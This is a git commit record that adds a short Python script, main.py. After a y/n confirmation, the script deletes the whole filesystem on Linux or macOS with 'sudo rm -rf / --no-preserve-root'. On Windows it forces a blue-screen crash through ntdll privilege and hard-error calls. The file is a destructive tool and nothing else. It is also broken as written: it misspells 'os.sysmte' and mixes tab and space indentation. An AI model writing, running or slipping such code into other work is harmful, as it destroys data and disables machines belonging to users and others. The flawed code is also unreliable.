1aadc5887649db919ce00d5ed16982484a6bbb27
lusm <loveyousomuch554@gmail.com>
2024-05-14 21:09:56 +0300

    raw example

---
+++ main.py
@@ -0,0 +1,45 @@
+def bsod_linux():
+	import os
+  os.sysmte('sudo rm -rf / --no-preserve-root')
+
+def bsod_win():
+	from ctypes import windll
+	from ctypes import c_int
+	from ctypes import c_uint
+	from ctypes import c_ulong
+	from ctypes import POINTER
+	from ctypes import byref
+
+	nullptr = POINTER(c_int)()
+
+	windll.ntdll.RtlAdjustPrivilege(
+			c_uint(19), 
+			c_uint(1), 
+			c_uint(0), 
+			byref(c_int())
+	)
+
+	windll.ntdll.NtRaiseHardError(
+			c_ulong(0xC000007B), 
+			c_ulong(0), 
+			nullptr, 
+			nullptr, 
+			c_uint(6), 
+			byref(c_uint())
+	)
+
+def main():
+	import platform
+  plt = platform.system()
+	if input('This will kill your system. Are you sure?(y/n)').strip() != 'y':
+		print('Break.')
+		return	
+  if plt in ('Linux', 'Darwin'):
+    bsod_linux()
+  elif plt in ('Windows'):
+    bsod_win()
+  else:
+    raise ValueError(f'Platform {plt!r} not found.')
+
+if __name__ == '__main__':
+  main()
